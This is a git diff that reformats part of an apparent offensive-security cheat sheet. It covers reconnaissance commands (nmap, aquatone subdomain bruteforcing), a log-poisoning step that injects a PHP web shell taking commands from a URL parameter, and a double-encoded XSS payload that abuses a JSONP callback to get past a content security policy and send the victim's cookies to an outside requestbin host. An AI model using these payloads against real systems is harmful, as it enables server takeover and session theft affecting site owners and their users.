@@ -65,25 +65,25 @@ $ nslookup [ hostname/ip ]
 ```
 
 **Nmap**  
-```
-Aggressive service/OS detection:
+```shell
+# Aggressive service/OS detection:
 $ nmap -sV --version-intensity 5 [ hostname/ip ]
 
-Scan all ports for the lolz:
+# Scan all ports for the lolz:
 $ nmap -p- [ hostname/ip ]
 $ nmap -sT -vv -p 1-65535 [ hostname/ip ]
 
-Scan most common ports (fast):
+# Scan most common ports (fast):
 $ nmap -F [ hostname/ip ]
 
-Increase Verbosity / Debugging:
+# Increase Verbosity / Debugging:
 $ nmap -vv OR -dd [ hostname/ip ]
 ```
 
 **LEVEL 1: Aquatone**
-```
-$ aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
-$ cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
+```shell
+$ aquatone-discover --domain [ ns.agency ]  # run subdomain bruteforcing
+$ cat ~/aquatone/example.com/hosts.txt      # show discovered subdomains
 ```
 **LEVEL 2: AltDNS**
 ```
@@ -147,7 +147,7 @@ STEP #3: Inject a payload into the logfile:
   * Attack vectors:
      * URL query string: `example.com/?q=injectpaylod`
      * HTTP Headers: Referer header.
-```
+```php
 $ <?php passthru($_GET['cmd']); ?>
 $ <?php passthru(['ls -l']); ?>
 ```
@@ -428,8 +428,9 @@ Bypass via. JSONP API callback param:
 //Payload Step #2 => Encode x2:
 <script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>
 
-Note:
-- Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
+/* Note:
+Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
+*/
 ```
 
 ---
